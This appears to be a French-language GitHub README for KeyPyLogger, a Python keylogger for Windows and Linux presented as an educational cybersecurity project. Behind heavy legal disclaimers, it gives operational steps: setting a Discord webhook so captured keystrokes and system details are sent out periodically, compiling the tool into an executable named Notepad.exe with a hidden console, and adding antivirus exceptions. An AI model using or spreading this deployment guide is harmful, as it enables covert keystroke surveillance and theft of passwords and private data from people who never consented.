# 🔐 KeyPyLogger

**Un keylogger éducatif cross-platform avec intégration Discord pour l'apprentissage de la cybersécurité**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.7+](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-lightgrey.svg)]()

---

## ⚠️ AVERTISSEMENT LÉGAL IMPORTANT

**LISEZ ATTENTIVEMENT AVANT D'UTILISER CET OUTIL**

Ce projet est strictement destiné à des **fins éducatives** et à des **tests de sécurité autorisés**.

### ✅ Utilisations Autorisées
- Cours et formations en cybersécurité
- Laboratoires de test en environnement contrôlé
- CTF (Capture The Flag) et compétitions de sécurité
- Recherche en sécurité sur vos propres systèmes
- Démonstrations pédagogiques

### ❌ Utilisations Interdites
- Surveillance non autorisée de tiers
- Espionnage ou violation de la vie privée
- Utilisation sans consentement explicite écrit
- Toute activité illégale

**L'utilisation de keyloggers sans autorisation est ILLÉGALE dans la plupart des juridictions et peut entraîner des poursuites pénales.**

---

## 🚀 Démarrage Rapide

### 1. Installation

```bash
# Cloner le repository
git clone https://github.com/Nyx-Off/KeyPyLogger.git
cd KeyPyLogger

# Installer les dépendances
pip install -r requirements.txt
```

### 2. Configuration

**Créer un Webhook Discord** :
1. Discord → Serveur → Paramètres → Intégrations → Webhooks
2. Créer un nouveau webhook
3. Copier l'URL

**Configurer le keylogger** :
```bash
# Windows
notepad src/windows/keylogger_windows.py

# Linux
nano src/linux/keylogger_linux.py
```

Remplacer cette ligne (ligne 20) par votre webhook :
```python
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
```

### 3. Exécution

```bash
# Windows
python src/windows/keylogger_windows.py

# Linux
python3 src/linux/keylogger_linux.py
```

Pour plus de détails, voir [QUICK_START.md](QUICK_START.md)

---

## 🎯 Fonctionnalités

- ✅ **Multi-plateforme** : Windows et Linux
- ✅ **Intégration Discord** : Envoi via webhooks
- ✅ **Configuration simple** : Édition directe du code
- ✅ **Compilation Windows** : Création d'exécutables standalone
- ✅ **Capture complète** : Toutes les touches y compris spéciales
- ✅ **Informations système** : Collecte automatique
- ✅ **Envoi périodique** : Intervalle configurable

---

## 📁 Structure du Projet

```
KeyPyLogger/
├── README.md                       # Documentation principale
├── QUICK_START.md                  # Guide de démarrage rapide
├── requirements.txt                # Dépendances Python
│
├── src/
│   ├── windows/
│   │   └── keylogger_windows.py   # Keylogger Windows
│   └── linux/
│       └── keylogger_linux.py     # Keylogger Linux
│
├── tools/
│   ├── compile_windows.py         # Compilateur Windows
│   └── test_webhook.py            # Test de connexion
│
└── docs/
    ├── INSTALLATION.md             # Guide d'installation
    ├── USAGE.md                    # Guide d'utilisation
    └── FAQ.md                      # Questions fréquentes
```

---

## 💻 Utilisation

### Windows

#### Script Python
```bash
python src/windows/keylogger_windows.py
```

#### Exécutable Compilé
```bash
# Compiler
python tools/compile_windows.py

# Exécuter
build/dist/Notepad.exe
```

### Linux

```bash
# Avec permissions
python3 src/linux/keylogger_linux.py

# Ou avec sudo si nécessaire
sudo python3 src/linux/keylogger_linux.py
```

### Test de Connexion

```bash
python tools/test_webhook.py
```

---

## ⚙️ Configuration

Dans les fichiers source (`src/windows/keylogger_windows.py` ou `src/linux/keylogger_linux.py`) :

```python
WEBHOOK_URL = "https://discord.com/api/webhooks/..."  # Votre webhook
SEND_INTERVAL = 60                                     # Intervalle en secondes
MAX_BUFFER_SIZE = 1000                                 # Taille max du buffer
```

---

## 🔨 Compilation (Windows)

Pour créer un exécutable Windows :

```bash
python tools/compile_windows.py
```

Options :
- **Option 1** : Console cachée (mode discret)
- **Option 2** : Console visible (debug)

L'exécutable sera dans `build/dist/`

---

## ❓ FAQ

### Le keylogger ne capture rien ?
- **Windows** : Vérifiez les permissions
- **Linux** : Exécutez avec `sudo` ou ajoutez votre user au groupe `input`

### Rien sur Discord ?
- Vérifiez l'URL du webhook
- Testez avec `tools/test_webhook.py`
- Vérifiez votre connexion Internet

### L'antivirus bloque ?
- Normal pour les keyloggers
- Ajoutez une exception dans votre antivirus
- Testez dans une VM

Plus de détails dans [docs/FAQ.md](docs/FAQ.md)

---

## 🎓 Contexte Éducatif

Ce projet est conçu pour apprendre :
- Le fonctionnement des keyloggers
- Les techniques de défense
- La programmation Python cross-platform
- L'interaction avec les APIs
- La cybersécurité défensive

**Recommandations** :
- Testez toujours dans un environnement isolé (VM)
- Documentez vos tests
- Explorez les méthodes de détection
- Respectez l'éthique et la légalité

---

## 🤝 Contribution

Les contributions sont les bienvenues !

1. Fork le projet
2. Créez une branche (`git checkout -b feature/AmazingFeature`)
3. Commit (`git commit -m 'Add AmazingFeature'`)
4. Push (`git push origin feature/AmazingFeature`)
5. Ouvrez une Pull Request

---

## 📄 Licence

Distribué sous licence MIT. Voir [LICENSE](LICENSE) pour plus d'informations.

---

## 📚 Documentation

- [QUICK_START.md](QUICK_START.md) - Guide de démarrage rapide
- [docs/INSTALLATION.md](docs/INSTALLATION.md) - Installation détaillée
- [docs/USAGE.md](docs/USAGE.md) - Utilisation complète
- [docs/FAQ.md](docs/FAQ.md) - Questions fréquentes

---

## ⚖️ Responsabilité

**EN UTILISANT CET OUTIL, VOUS ACCEPTEZ :**

- De l'utiliser uniquement à des fins éducatives et légales
- D'obtenir un consentement explicite avant tout test
- De ne pas porter atteinte à la vie privée d'autrui
- D'assumer l'entière responsabilité de votre utilisation

**L'auteur décline toute responsabilité en cas d'utilisation abusive ou illégale.**

---

<div align="center">

**⚠️ Projet Éducatif - Utilisez de Manière Responsable ⚠️**

*Développé pour l'apprentissage de la cybersécurité* 🎓

</div>
